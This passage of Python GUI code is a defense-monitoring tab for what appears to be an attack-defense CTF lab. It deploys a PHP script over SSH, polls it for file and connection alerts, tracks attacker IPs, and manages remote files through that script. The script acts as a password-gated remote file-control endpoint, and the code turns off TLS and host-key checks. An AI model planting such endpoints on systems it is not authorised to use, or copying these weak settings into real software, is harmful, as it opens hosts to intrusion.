    'new': '#00ff9d', 'mod': '#ffcc00', 'del': '#ff4d6d', 'conn': '#c084fc',
    'bg': '#070b14', 'card_bg': '#0d1526', 'card_hi': '#111c33',
    'border': '#1b2a4a', 'text': '#d6e4ff', 'text_dim': '#6b7f9e',
    'accent': '#00d4ff', 'accent2': '#7c5cff', 'ok': '#00ff9d', 'warn': '#ffcc00',
}
MON_CK = {
    'new': '#00ff9d', 'mod': '#ffcc00', 'del': '#ff4d6d', 'conn': '#c084fc',
    'bg': '#070b14', 'card_bg': '#0d1526', 'border': '#1b2a4a',
    'text': '#d6e4ff', 'text_dim': '#6b7f9e', 'accent': '#00d4ff',
}

def neo_card(parent, padx=1, pady=1, glow='#00d4ff'):
    f = tk.Frame(parent, bg=NEO['border'], bd=0)
    inner = tk.Frame(f, bg=NEO['card_bg'], bd=0, highlightthickness=1,
        highlightcolor=NEO['border'], highlightbackground=NEO['border'])
    inner.pack(fill=tk.BOTH, expand=True, padx=padx, pady=pady)
    return inner

def neo_btn(parent, text, cmd=None, color='#00d4ff', fg='#04121a', bold=False,
            padx=10, pady=3, font_size=9, side=None):
    b = tk.Button(parent, text=text, command=cmd, bg=color, fg=fg,
        relief=tk.FLAT, bd=0, padx=padx, pady=pady, cursor='hand2',
        font=('微软雅黑', font_size, 'bold' if bold else 'normal'),
        activebackground=color, activeforeground=fg,
        highlightthickness=1, highlightcolor=color, highlightbackground=color)
    def _enter(e):
        b.config(bg=NEO['bg'], fg=color, highlightbackground=color, highlightcolor=color)
    def _leave(e):
        b.config(bg=color, fg=fg, highlightbackground=color, highlightcolor=color)
    b.bind('<Enter>', _enter); b.bind('<Leave>', _leave)
    if side: b.pack(side=side, padx=3, pady=2)
    else: b.pack(padx=3, pady=2)
    return b

def neo_title(parent, text, size=12, padx=4, pady=(8,2)):
    f = tk.Frame(parent, bg=NEO['bg'])
    f.pack(fill=tk.X, padx=padx, pady=pady)
    tk.Label(f, text=text, font=('微软雅黑', size, 'bold'), fg=NEO['accent'], bg=NEO['bg']).pack(side=tk.LEFT)
    bar = tk.Frame(f, bg=NEO['accent'], height=2)
    bar.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(8,0), pady=(size//2,0))
    return f

class MonitorTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.target_url = tk.StringVar(value='http://127.0.0.1:8090/target_monitor.php')
        self.password = tk.StringVar(value='cmd')
        self.monitoring = False
        self.log_data = []
        self.last_json_hash = ''
        self.new_alerts = 0; self.file_count = 0; self.conn_count = 0
        self._lock = threading.Lock()
        self.cfg_file = os.path.join(CONFIG_DIR, 'monitor_config.json')
        self.build_ui()
        self.load_config()

    def build_ui(self):
        f = tk.Frame(self.parent, bg=MON_CK['bg'])
        f.pack(fill=tk.BOTH, expand=True)
        # ── 提示区 ──
        hint_f = tk.Frame(f, bg='#0d1526', bd=0, highlightthickness=1, highlightcolor='#7c5cff', highlightbackground='#7c5cff')
        hint_f.pack(fill=tk.X, padx=4, pady=(4,0))
        tk.Label(hint_f, text='💡 首次使用需部署监控脚本：SSH连接靶机后上传 target_monitor.php 到Web目录，或点击右侧"一键部署"',
            fg='#c084fc', bg='#0d1526', font=('微软雅黑', 8), wraplength=800, justify=tk.LEFT).pack(padx=6, pady=2, anchor=tk.W)
        tk.Label(hint_f, text='⚠️ 端口必须填【网页(HTTP)端口】，不是SSH端口！例如靶机 SSH=2204、网页=8804 时填 http://IP:8804/target_monitor.php',
            fg='#ff9d5c', bg='#0d1526', font=('微软雅黑', 8), wraplength=800, justify=tk.LEFT).pack(padx=6, pady=2, anchor=tk.W)
        # ── 工具栏 ──
        toolbar = tk.Frame(f, bg=NEO['card_bg'], bd=0, highlightthickness=1, highlightcolor=NEO['border'], highlightbackground=NEO['border'])
        toolbar.pack(fill=tk.X, padx=4, pady=4)
        tk.Label(toolbar, text="URL:", fg=NEO['text_dim'], bg=NEO['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(6,2))
        self.e_url = tk.Entry(toolbar, textvariable=self.target_url, width=36, bg='#111c33', fg=NEO['text'],
            insertbackground=NEO['accent'], relief=tk.FLAT, font=('Consolas', 9), bd=0, highlightthickness=1, highlightcolor=NEO['border'])
        self.e_url.pack(side=tk.LEFT, padx=2)
        tk.Label(toolbar, text="密码:", fg=NEO['text_dim'], bg=NEO['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(6,2))
        self.e_pw = tk.Entry(toolbar, textvariable=self.password, width=12, bg='#111c33', fg=NEO['text'],
            insertbackground=NEO['accent'], relief=tk.FLAT, font=('Consolas', 9), bd=0, highlightthickness=1, highlightcolor=NEO['border'])
        self.e_pw.pack(side=tk.LEFT, padx=2)
        self.btn_start_mon = neo_btn(toolbar, '▶ 开始', self.toggle, color='#00ff9d', fg='#04121a', bold=True, side=tk.LEFT)
        neo_btn(toolbar, '🚀 一键部署', self.deploy_monitor, color='#7c5cff', fg='#ffffff', side=tk.LEFT)
        self.btn_export_mon = neo_btn(toolbar, '📥', self.export_log, color=NEO['card_hi'], fg=NEO['text'], side=tk.LEFT)
        self.btn_clear_mon = neo_btn(toolbar, '🗑', self.clear_log, color=NEO['card_hi'], fg=NEO['text'], side=tk.LEFT)
        stats = tk.Frame(f, bg=NEO['bg'])
        stats.pack(fill=tk.X, padx=4, pady=(0,4))
        self.cards = {}
        for kid, lbl, col in [('file', '\U0001f4c1 文件', '#00ff9d'), ('conn', '\U0001f50c 连接', '#c084fc'),
                              ('total', '\U0001f4ca 日志', NEO['accent']), ('alert', '\U0001f6a8 警报', '#ff4d6d')]:
            card = tk.Frame(stats, bg=NEO['border'], bd=0)
            card.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
            inner = tk.Frame(card, bg=NEO['card_bg'], bd=0, highlightthickness=1, highlightcolor=NEO['border'], highlightbackground=NEO['border'])
            inner.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
            topbar = tk.Frame(inner, bg=col, height=2)
            topbar.pack(fill=tk.X)
            n = tk.Label(inner, text='0', fg=col, bg=NEO['card_bg'], font=('Consolas', 18, 'bold'))
            n.pack(pady=(4,0))
            tk.Label(inner, text=lbl, fg=NEO['text_dim'], bg=NEO['card_bg'], font=('微软雅黑', 8)).pack(pady=(0,4))
            self.cards[kid] = n
        self.status_label = tk.Label(f, text="就绪", fg=MON_CK['text_dim'], bg=MON_CK['card_bg'],
            font=('微软雅黑', 9), anchor=tk.W, bd=0, highlightthickness=1, highlightcolor=MON_CK['border'])
        self.status_label.pack(fill=tk.X, padx=4, pady=(0,4))
        # ── 底部子标签 ──
        bot_nb = tb.Notebook(f, bootstyle='dark')
        bot_nb.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0,4))
        # 子页1: 监控日志
        self.mon_log_frame = tb.Frame(bot_nb)
        bot_nb.add(self.mon_log_frame, text='  \U0001f4dd 监控日志  ')
        # 搜索栏
        srch_f = tb.Frame(self.mon_log_frame); srch_f.pack(fill=tk.X, padx=2, pady=2)
        self.mon_search_var = tk.StringVar()
        tb.Entry(srch_f, textvariable=self.mon_search_var, width=30).pack(side=tk.LEFT, padx=2)
        tb.Button(srch_f, text='🔍 搜索', command=self._mon_search, width=6).pack(side=tk.LEFT, padx=2)
        tb.Button(srch_f, text='✕ 清除', command=self._mon_clear_search, width=4).pack(side=tk.LEFT, padx=2)
        self.log_text = scrolledtext.ScrolledText(self.mon_log_frame, bg=MON_CK['card_bg'], fg=MON_CK['text'],
            insertbackground=MON_CK['text'], font=('Consolas', 9), bd=0, highlightthickness=1,
            highlightcolor=MON_CK['border'], state=tk.DISABLED, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        for t, c in [('t', MON_CK['text_dim']),('new','#00ff9d'),('mod','#ffcc00'),('del','#ff4d6d'),('conn','#c084fc'),('hit','#ffa657'),('scan','#ffa657'),('alert','#ff4d6d'),('ts',MON_CK['text_dim'])]:
            self.log_text.tag_config(t, foreground=c)
        self.log_text.tag_config('alert', foreground='#ff4d6d', font=('Consolas', 9, 'bold'))
        # 子页2: 攻击者TOP
        bot_atk = tb.Frame(bot_nb); bot_nb.add(bot_atk, text='  \U0001f525 攻击者TOP  ')
        atk_top = tb.Frame(bot_atk); atk_top.pack(fill=tk.X, padx=4, pady=2)
        self.atk_tree = tb.Treeview(bot_atk, columns=('rank','ip','count','bad','last_seen'), show='headings', height=8, bootstyle='dark')
        self.atk_tree.heading('rank', text='#'); self.atk_tree.heading('ip', text='攻击者IP')
        self.atk_tree.heading('count', text='请求数'); self.atk_tree.heading('bad', text='恶意/4xx')
        self.atk_tree.heading('last_seen', text='最后时间')
        self.atk_tree.column('rank', width=30); self.atk_tree.column('ip', width=150)
        self.atk_tree.column('count', width=70); self.atk_tree.column('bad', width=70); self.atk_tree.column('last_seen', width=100)
        self.atk_tree.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        self.atk_data = {}  # ip -> {'count': n, 'last': time}
        tb.Button(atk_top, text='\U0001f5d1 清空', command=self.clear_atk, width=6).pack(side=tk.LEFT, padx=2)
        tb.Button(atk_top, text='\U0001f4e5 导出', command=self.export_atk, width=6).pack(side=tk.LEFT, padx=2)
        self.lbl_atk_stat = tb.Label(atk_top, text='', foreground='#6b7f9e')
        self.lbl_atk_stat.pack(side=tk.LEFT, padx=8)
        # 子页3: 告警配置
        bot_alert = tb.Frame(bot_nb); bot_nb.add(bot_alert, text='  \U0001f514 告警配置  ')
        al_f = tb.Frame(bot_alert); al_f.pack(fill=tk.X, padx=8, pady=8)
        self.alert_sound = tk.BooleanVar(value=True)
        tb.Checkbutton(al_f, text='启用声音告警', variable=self.alert_sound, bootstyle='success').pack(anchor=tk.W, pady=2)
        tb.Label(al_f, text='告警阈值(文件变更/秒):').pack(anchor=tk.W)
        self.alert_threshold = tb.Entry(al_f, width=6); self.alert_threshold.insert(0, '1'); self.alert_threshold.pack(anchor=tk.W, pady=2)
        tb.Label(al_f, text='阈值时间内超过此数量则触发告警', foreground='#6b7f9e', font=('微软雅黑', 8)).pack(anchor=tk.W)
        self.lbl_alert_status = tb.Label(al_f, text='\u23f8 告警监控未启动', foreground='#6b7f9e')
        self.lbl_alert_status.pack(anchor=tk.W, pady=6)
        self._alert_times = []  # timestamps of recent alerts for threshold
        # Tab 4: 文件管理
        fm_f = tb.Frame(bot_nb); bot_nb.add(fm_f, text="  📂 文件管理  ")
        fm_tb = tb.Frame(fm_f); fm_tb.pack(fill=tk.X, padx=4, pady=2)
        self.fm_path = tk.StringVar(value="/")
        tb.Label(fm_tb, textvariable=self.fm_path, font=("Consolas", 9), foreground="#00d4ff").pack(side=tk.LEFT, padx=4)
        tb.Button(fm_tb, text="⬆ 返回", command=self.fm_go_up, width=4).pack(side=tk.LEFT, padx=2)
        tb.Button(fm_tb, text="🔄 刷新", command=self.fm_refresh, width=6).pack(side=tk.LEFT, padx=2)
        tb.Button(fm_tb, text="📤 上传", command=self.fm_upload_file, width=6).pack(side=tk.LEFT, padx=2)
        tb.Button(fm_tb, text="📁 新建目录", command=self.fm_mkdir, width=8).pack(side=tk.LEFT, padx=2)
        fm_srch = tb.Frame(fm_f); fm_srch.pack(fill=tk.X, padx=4, pady=(0,2))
        self.fm_search_var = tk.StringVar()
        self.fm_search_entry = tb.Entry(fm_srch, textvariable=self.fm_search_var, width=24)
        self.fm_search_entry.pack(side=tk.LEFT, padx=2)
        self.fm_search_entry.bind("<Return>", lambda e: self.fm_search())
        tb.Button(fm_srch, text='🔍 搜索文件', command=self.fm_search, width=10, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Button(fm_srch, text='✕ 清除', command=self.fm_clear_search, width=5).pack(side=tk.LEFT, padx=2)
        self.fm_status = tb.Label(fm_srch, text='', foreground='#6b7f9e')
        self.fm_status.pack(side=tk.LEFT, padx=6)
        self.fm_search_mode = False
        self.fm_search_items = []
        cols_f = tk.Frame(fm_f, bg=MON_CK["bg"])
        cols_f.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0,4))
        fl = tk.Frame(cols_f, bg=MON_CK["bg"])
        fl.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.fm_list = tk.Listbox(fl, bg="#0d1526", fg=MON_CK["text"], selectbackground="#1b2a4a",
            font=("Consolas", 10), bd=0, highlightthickness=1, highlightcolor=MON_CK["border"], relief=tk.FLAT)
        self.fm_list.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)
        self.fm_list.bind("<Double-Button-1>", self.fm_double_click)
        fm_sb = tk.Scrollbar(fl, orient=tk.VERTICAL, command=self.fm_list.yview)
        fm_sb.pack(side=tk.RIGHT, fill=tk.Y)
        self.fm_list.config(yscrollcommand=fm_sb.set)
        act = tk.Frame(cols_f, bg=MON_CK["card_bg"], bd=0, highlightthickness=1, highlightcolor=MON_CK["border"], width=140)
        act.pack(side=tk.RIGHT, fill=tk.Y, padx=(4,0)); act.pack_propagate(False)
        for txt, cmd in [("✏️ 编辑",self.fm_edit_file),("🗑 删除",self.fm_delete_file),("⬇ 下载",self.fm_download)]:
            tk.Button(act, text=txt, command=cmd, bg=MON_CK["card_bg"], fg=MON_CK["text"],
                relief=tk.FLAT, bd=0, pady=4, cursor="hand2", font=("微软雅黑",9), activebackground="#1b2a4a").pack(fill=tk.X, padx=4, pady=2)
        self.fm_editor = tk.Frame(fm_f, bg=MON_CK["bg"], height=180)
        self.fm_editor.pack_forget()
        editor_bar = tk.Frame(self.fm_editor, bg=MON_CK["card_bg"])
        editor_bar.pack(fill=tk.X)
        self.fm_edit_title = tk.Label(editor_bar, text="", fg=MON_CK["accent"], bg=MON_CK["card_bg"], font=("微软雅黑",9,"bold"))
        self.fm_edit_title.pack(side=tk.LEFT, padx=6)
        tk.Button(editor_bar, text="💾 保存", command=self.fm_save_file, bg="#00ff9d", fg="white",
            relief=tk.FLAT, bd=0, padx=8, pady=2, cursor="hand2", font=("微软雅黑",9)).pack(side=tk.RIGHT, padx=4, pady=2)
        tk.Button(editor_bar, text="✕ 关闭", command=self.fm_close_editor, bg=MON_CK["card_bg"],
            fg=MON_CK["text"], relief=tk.FLAT, bd=0, padx=8, pady=2, cursor="hand2", font=("微软雅黑",9)).pack(side=tk.RIGHT, padx=4, pady=2)
        self.fm_edit_box = scrolledtext.ScrolledText(self.fm_editor, bg="#070b14", fg=MON_CK["text"],
            insertbackground=MON_CK["text"], font=("Consolas", 11), bd=0, highlightthickness=1, highlightcolor=MON_CK["border"], wrap=tk.NONE)
        self.fm_edit_box.pack(fill=tk.BOTH, expand=True)

    def deploy_monitor(self):
        """一键部署 target_monitor.php 到靶机"""
        win = tk.Toplevel(self.parent)
        win.title('一键部署监控脚本')
        win.geometry('450x300')
        win.transient(self.parent)
        win.grab_set()
        win.configure(bg=MON_CK['bg'])

        tk.Label(win, text='🚀 一键部署 target_monitor.php', fg=MON_CK['accent'], bg=MON_CK['bg'],
            font=('微软雅黑', 11, 'bold')).pack(pady=(12,8))
        tk.Label(win, text='通过 SSH 将监控脚本上传到靶机 Web 目录', fg=MON_CK['text_dim'], bg=MON_CK['bg'],
            font=('微软雅黑', 9)).pack()
        tk.Label(win, text='⚠️ 部署后用【网页端口】访问(不是SSH端口)，例如: http://IP:8804/target_monitor.php?u=monitor&p=密码',
            fg='#ff9d5c', bg=MON_CK['bg'], font=('微软雅黑', 8), wraplength=400, justify=tk.LEFT).pack(pady=(4,0))

        form = tk.Frame(win, bg=MON_CK['bg'])
        form.pack(padx=20, pady=10, fill=tk.X)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        fields = [
            ('SSH地址:', 'ssh_host', pre.get('host', '')),
            ('SSH端口:', 'ssh_port', pre.get('port', '22')),
            ('用户名:', 'ssh_user', pre.get('user', 'root')),
            ('密码:', 'ssh_pass', pre.get('pwd', '')),
            ('Web目录:', 'web_dir', pre.get('webdir', '/var/www/html')),
        ]
        self._deploy_vars = {}
        for label, key, default in fields:
            row = tk.Frame(form, bg=MON_CK['bg'])
            row.pack(fill=tk.X, pady=2)
            tk.Label(row, text=label, fg=MON_CK['text'], bg=MON_CK['bg'], width=8, anchor=tk.W, font=('微软雅黑', 9)).pack(side=tk.LEFT)
            var = tk.StringVar(value=default)
            self._deploy_vars[key] = var
            show = ''
            tk.Entry(row, textvariable=var, width=30, bg='#111c33', fg=MON_CK['text'],
                insertbackground=MON_CK['text'], relief=tk.FLAT, font=('Consolas', 9), show='').pack(side=tk.LEFT, padx=4)

        def do_deploy():
            host = self._deploy_vars['ssh_host'].get().strip()
            port = self._deploy_vars['ssh_port'].get().strip()
            user = self._deploy_vars['ssh_user'].get().strip()
            pwd = self._deploy_vars['ssh_pass'].get().strip()
            web_dir = self._deploy_vars['web_dir'].get().strip()
            if not host or not pwd:
                messagebox.showerror("错误", "请填写SSH地址和密码"); return
            # 尝试多个可能的路径
            candidates = [
                os.path.join(BASE, '上传靶机', 'target_monitor.php'),
                os.path.join(BASE, 'target_monitor.php'),
                os.path.join(os.path.dirname(sys.executable), '上传靶机', 'target_monitor.php'),
                os.path.join(os.path.dirname(sys.executable), 'target_monitor.php'),
            ]
            php_path = None
            for p in candidates:
                if os.path.exists(p):
                    php_path = p
                    break
            if not php_path:
                msg = f"找不到 target_monitor.php\n尝试过的路径:\n" + "\n".join(candidates)
                messagebox.showerror("错误", msg); return
            self.status_label.config(text='🚀 正在部署...')
            win.destroy()
            mon_pw = self.password.get().strip()
            def _deploy():
                try:
                    import paramiko
                    # 读取PHP模板并注入密码
                    with open(php_path, 'r', encoding='utf-8') as f:
                        php_content = f.read()
                    php_content = php_content.replace('y|lladmin121.@ss', mon_pw)
                    php_content = php_content.replace("$P='1ffd501f923a54275c3137b6aa362627'", "$P='" + mon_pw + "'")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    remote = f"{web_dir}/target_monitor.php"
                    with sftp.open(remote, 'w') as f:
                        f.write(php_content)
                    sftp.close()
                    ssh.close()
                    self.root.after(0, lambda: self.status_label.config(text='✅ 部署成功！点击"开始"监控'))
                    self.root.after(0, lambda: messagebox.showinfo("成功", f"已部署到 {remote}"))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.status_label.config(text=f'❌ 部署失败: {e}'))
                    self.root.after(0, lambda e=e: messagebox.showerror("部署失败", str(e)))
            async_run(_deploy)

        tk.Button(form, text='🚀 开始部署', command=do_deploy, bg='#00ff9d', fg='#04121a',
            relief=tk.FLAT, bd=0, padx=20, pady=6, cursor='hand2', font=('微软雅黑', 10, 'bold'),
            activebackground='#00ff9d').pack(pady=10)

    def load_config(self):
        cfg = ConfigManager.get_section('monitor')
        if cfg.get('url'): self.target_url.set(cfg['url'])
        if cfg.get('password'): self.password.set(cfg['password'])
        if os.path.exists(self.cfg_file):
            try:
                with open(self.cfg_file, 'r', encoding='utf-8') as f:
                    c = json.load(f)
                if 'url' in c: self.target_url.set(c['url'])
                if 'password' in c: self.password.set(c['password'])
            except Exception: pass

    def save_config(self):
        ConfigManager.set_section('monitor', {'url': self.target_url.get(), 'password': self.password.get()})
        ConfigManager.save()
        try:
            atomic_write(self.cfg_file, json.dumps({'url': self.target_url.get(), 'password': self.password.get()}, ensure_ascii=False, indent=2))
        except Exception: pass

    def toggle(self):
        if not self.monitoring:
            if not self.target_url.get().strip(): messagebox.showerror("错误", "请填写URL"); return
            self.monitoring = True; self.last_json_hash = ''
            self.btn_start_mon.config(text='\u23f9 停止', bg='#ff4d6d', activebackground='#ff4d6d')
            self.status_label.config(text='\U0001f7e2 监控中...')
            async_run(self.loop)
        else:
            self.monitoring = False; self.btn_start_mon.config(text='\u25b6 开始', bg='#00ff9d', activebackground='#00ff9d')
            self.status_label.config(text='\u23f8 已停止')

    def loop(self):
        ctx = ssl._create_unverified_context()
        base = self.target_url.get().strip()
        if base and not base.startswith(('http://','https://')):
            base = 'http://' + base
        pw = self.password.get().strip()
        self.target_url.set(base)
        while self.monitoring:
            try:
                url = f"{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=1&_={int(time.time()*1000)}"
                with urllib.request.urlopen(urllib.request.Request(url), timeout=10, context=ctx) as resp:
                    d = json.loads(resp.read().decode('utf-8'))
                if 'lines' in d:
                    h = json.dumps(d['lines'], sort_keys=True)
                    if h != self.last_json_hash:
                        self.last_json_hash = h
                        self.root.after(0, self.add_lines, list(d['lines']))
                if 'atk' in d:
                    self.root.after(0, self._update_atk_server, list(d['atk']))
                if 'sys' in d and d['sys']:
                    self.root.after(0, self._update_sys, d['sys'])
                self.root.after(0, lambda t=d.get('time',''): self.status_label.config(text=f'\U0001f7e2 监控中 - {t}'))
            except urllib.error.HTTPError as e:
                self.root.after(0, lambda c=e.code: self.status_label.config(text=f'\u26a0 HTTP {c}'))
            except urllib.error.URLError as e:
                self.root.after(0, lambda r=e.reason: self.status_label.config(text=f'\u26a0 连接失败: {r}'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.status_label.config(text=f'\u26a0 {e}'))
            time.sleep(3.5)

    def _mon_search(self):
        kw = self.mon_search_var.get().strip()
        if not kw: return
        self.log_text.config(state=tk.NORMAL)
        self.log_text.tag_remove('search', '1.0', tk.END)
        self.log_text.tag_config('search', background='#e06c00', foreground='white')
        pos = '1.0'
        count = 0
        while True:
            pos = self.log_text.search(kw, pos, tk.END, nocase=True)
            if not pos: break
            end = f'{pos}+{len(kw)}c'
            self.log_text.tag_add('search', pos, end)
            pos = end
            count += 1
        self.log_text.config(state=tk.DISABLED)
        self.status_label.config(text=f'找到 {count} 处匹配')

    def _mon_clear_search(self):
        self.mon_search_var.set('')
        self.log_text.config(state=tk.NORMAL)
        self.log_text.tag_remove('search', '1.0', tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.status_label.config(text='搜索已清除')

    def add_lines(self, lines):
        added = 0
        with self._lock:
            for l in lines:
                if l and (not self.log_data or l != self.log_data[-1]):
                    self.log_data.append(l); added += 1
                    is_alert = False
                    if '[ALERT]' in l:
                        self.new_alerts += 1; is_alert = True
                    if '[NEW]' in l or '[MOD]' in l or '[DEL]' in l:
                        self.file_count += 1
                        if '[NEW]' in l: is_alert = True
                    if '[CONN]' in l or '[HIT]' in l:
                        self.conn_count += 1
                        if '[HIT]' in l: self.new_alerts += 1; is_alert = True
                    # Extract attacker IP from log line
                    ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', l)
                    if ips and is_alert:
                        self.root.after(0, lambda i=ips[0]: self.track_attacker(i))
            if len(self.log_data) > 2000: self.log_data = self.log_data[-2000:]
        if added:
            self.cards['file'].config(text=str(self.file_count))
            self.cards['conn'].config(text=str(self.conn_count))
            self.cards['alert'].config(text=str(self.new_alerts))
            with self._lock: self.cards['total'].config(text=str(len(self.log_data)))
            self.refresh_log()

    def refresh_log(self):
        self.log_text.config(state=tk.NORMAL); self.log_text.delete('1.0', tk.END)
        with self._lock: data = list(self.log_data)
        data.reverse()  # 最新在前
        for line in data:
            if line.count(']') >= 2:
                idx = line.rindex(']') + 1; ts = line[:idx]; content = line[idx:].strip()
                self.log_text.insert(tk.END, ts + ' ', 'ts')
                tag = 't'
                if content.startswith('[ALERT]'): tag = 'alert'
                elif content.startswith('[NEW]'): tag = 'new'
                elif content.startswith('[MOD]'): tag = 'mod'
                elif content.startswith('[DEL]'): tag = 'del'
                elif content.startswith('[HIT]'): tag = 'hit'
                elif content.startswith('[SCAN]'): tag = 'scan'
                elif content.startswith('[CONN]'): tag = 'conn'
                self.log_text.insert(tk.END, content + '\n', tag)
            else: self.log_text.insert(tk.END, line + '\n', 't')
        self.log_text.see(tk.END); self.log_text.config(state=tk.DISABLED)

    def clear_log(self):
        with self._lock: self.log_data.clear()
        self.file_count = 0; self.conn_count = 0; self.new_alerts = 0
        for k in ('file','conn','total','alert'): self.cards[k].config(text='0')
        self.refresh_log()

    # ── 攻击者追踪 ──
    def track_attacker(self, ip):
        now = datetime.now().strftime('%H:%M:%S')
        if ip not in self.atk_data:
            self.atk_data[ip] = {'count': 0, 'last': now}
        self.atk_data[ip]['count'] += 1
        self.atk_data[ip]['last'] = now
        self._check_alert_threshold()
        self._refresh_atk_tree()

    def _refresh_atk_tree(self):
        for i in self.atk_tree.get_children(): self.atk_tree.delete(i)
        sorted_data = sorted(self.atk_data.items(), key=lambda x: -x[1]['count'])[:10]
        for rank, (ip, data) in enumerate(sorted_data, 1):
            self.atk_tree.insert('', tk.END, values=(rank, ip, data['count'], data.get('bad', 0), data['last']))
        self.lbl_atk_stat.config(text=f'总计 {sum(d["count"] for d in self.atk_data.values())} 次请求')

    def _update_atk_server(self, atk):
        """服务端权威攻击统计 (5分钟窗口)"""
        with self._lock:
            self.atk_data.clear()
            for item in atk:
                if len(item) >= 4:
                    ip, c, s, ts = item[0], item[1], item[2], item[3]
                else:
                    ip, c, s, ts = item[0], item[1], 0, ''
                self.atk_data[ip] = {'count': int(c), 'bad': int(s), 'last': str(ts)}
        self._refresh_atk_tree()

    def _update_sys(self, sysd):
        txt = ''
        if 'load' in sysd and sysd['load']: txt += '系统负载: ' + sysd['load']
        if 'disk' in sysd and sysd['disk']: txt += ' | 磁盘已用: ' + sysd['disk']
        if 'proc' in sysd and sysd['proc']: txt += ' | 🚨 可疑进程!'
        if txt:
            self.lbl_atk_stat.config(text=txt)

    def clear_atk(self):
        self.atk_data.clear()
        self._refresh_atk_tree()

    def export_atk(self):
        p = filedialog.asksaveasfilename(defaultextension='.csv', initialfile='attackers.csv', filetypes=[('CSV', '*.csv')])
        if not p: return
        try:
            with open(p, 'w', encoding='utf-8-sig') as f:
                f.write('排名,IP,请求数,恶意/4xx,最后时间\n')
                for rank, (ip, data) in enumerate(sorted(self.atk_data.items(), key=lambda x: -x[1]['count']), 1):
                    f.write(f'{rank},{ip},{data["count"]},{data.get("bad", 0)},{data["last"]}\n')
            self.status_label.config(text=f'\u2705 已导出 {p}')
        except Exception as e: messagebox.showerror('导出失败', str(e))

    def _check_alert_threshold(self):
        try:
            threshold = int(self.alert_threshold.get().strip() or 1)
        except Exception: threshold = 1
        now = time.time()
        self._alert_times.append(now)
        # Keep only last 10 seconds
        self._alert_times = [t for t in self._alert_times if now - t < 10]
        last = getattr(self, '_last_beep', 0)
        if len(self._alert_times) >= threshold and self.alert_sound.get() and now - last >= 25:
            self._last_beep = now
            self.lbl_alert_status.config(text='\U0001f514 \U0001f6a8 告警触发! 检测到可疑攻击', foreground='#ff4d6d')
            try:
                import winsound
                winsound.MessageBeep(winsound.MB_ICONHAND)
            except Exception:
                try:
                    print('\a', end='', flush=True)
                except Exception: pass
        else:
            self.lbl_alert_status.config(text=f'\U0001f7e2 当前频率: {len(self._alert_times)}/10s', foreground='#00ff9d')

    def export_log(self):
        p = filedialog.asksaveasfilename(defaultextension='.csv', filetypes=[('CSV', '*.csv'), ('Text', '*.txt')],
            initialfile=f"monitor_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
        if not p: return
        try:
            with self._lock: data = list(self.log_data)
            with open(p, 'w', encoding='utf-8-sig') as f:
                if p.endswith('.csv'):
                    f.write('\ufeff时间,类型,详情\n')
                    for l in data:
                        if l.count(']') >= 2:
                            idx = l.rindex(']') + 1; ts = l[:idx].strip('[]'); content = l[idx:].strip()
                            etype = '文件' if content.startswith(('[NEW]','[MOD]','[DEL]')) else '连接'
                            f.write(f'{ts},{etype},{content}\n')
                else:
                    f.write(f"Defense Monitor - {datetime.now()}\n{'='*60}\n\n")
                    for l in data: f.write(l + '\n')
            self.status_label.config(text=f'\u2705 已导出')
        except Exception as e: messagebox.showerror("导出失败", str(e))



    def fm_base(self):
        return self.target_url.get().strip()

    def fm_req(self, action, params=None):
        import urllib.parse
        base = self.fm_base(); pw = self.password.get().strip()
        url = f"{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=fm&action={action}"
        if params: url += "&" + urllib.parse.urlencode(params)
        try:
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(urllib.request.Request(url), timeout=15, context=ctx) as resp:
                return json.loads(resp.read().decode("utf-8"))
        except Exception as e:
            messagebox.showerror("错误", f"连接失败: {e}")
            return None

    def fm_post(self, action, data):
        import urllib.parse
        base = self.fm_base(); pw = self.password.get().strip()
        url = f"{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=fm&action={action}"
        try:
            ctx = ssl._create_unverified_context()
            body = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request(url, data=body)
            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                return json.loads(resp.read().decode("utf-8"))
        except Exception as e:
            messagebox.showerror("错误", f"连接失败: {e}")
            return None

    def fm_search(self):
        kw = self.fm_search_var.get().strip()
        if not kw:
            messagebox.showwarning("提示", "请输入搜索关键字"); return
        d = self.fm_req("search", {"kw": kw})
        if not d: return
        if d.get("error"):
            messagebox.showerror("搜索失败", d["error"]); return
        self.fm_list.delete(0, tk.END)
        self.fm_search_items = []
        for f in d.get("items", []):
            icon = "📁" if f.get("d") else "📄"
            sz = f.get("s", 0)
            szs = f"{sz}B" if sz < 1024 else f"{sz/1024:.1f}KB" if sz < 1048576 else f"{sz/1048576:.1f}MB"
            self.fm_list.insert(tk.END, f"{icon} {f.get('n','')}  ({szs})")
            self.fm_search_items.append((f.get('n', ''), bool(f.get('d'))))
        self.fm_search_mode = True
        self.fm_status.config(text=f"🔎 搜索『{kw}』: {d.get('found', len(self.fm_search_items))} 个结果 (双击文件打开/目录跳转)")

    def fm_clear_search(self):
        self.fm_search_var.set("")
        self.fm_search_mode = False
        self.fm_search_items = []
        self.fm_status.config(text="")
